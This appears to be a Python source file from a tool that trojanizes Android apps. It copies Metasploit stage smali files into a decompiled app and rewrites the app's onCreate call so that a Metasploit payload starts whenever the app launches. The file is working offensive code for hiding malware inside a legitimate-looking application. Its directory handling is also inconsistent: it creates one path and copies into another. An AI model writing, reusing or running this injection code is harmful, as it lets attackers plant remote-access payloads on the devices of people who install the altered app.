import errno
import os


def mkdir_p(path):
    """
        make directories and accepts that a directory may be already there.
        Legacy function for Python < 3.5
        :param path: - to be created
    """
    try:
        os.makedirs(path)
    except OSError as exc:  # Python >2.5
        if exc.errno == errno.EEXIST and os.path.isdir(path):
            pass
        else:
            raise


def generate_hooked_smali(smali_path):
    """
        Create the hooked smali.
        Note that smali_path points to the file with the original smalli code
    """
    activity_smali = []
    with open(smali_path) as f:
        activity_smali.extend(f.readlines())
    mkdir_p('original/_decompiled/smali/com/metasploit/stage')

    os.system('cp payload/_decompiled/smali/com/metasploit/stage/*.smali '
              'original/smali/com/metasploit/stage/')

    # replace comment for launchin activity with payload
    activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
    payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"

    return [line.replace(activitycreate, payloadhook) for line in activity_smali]
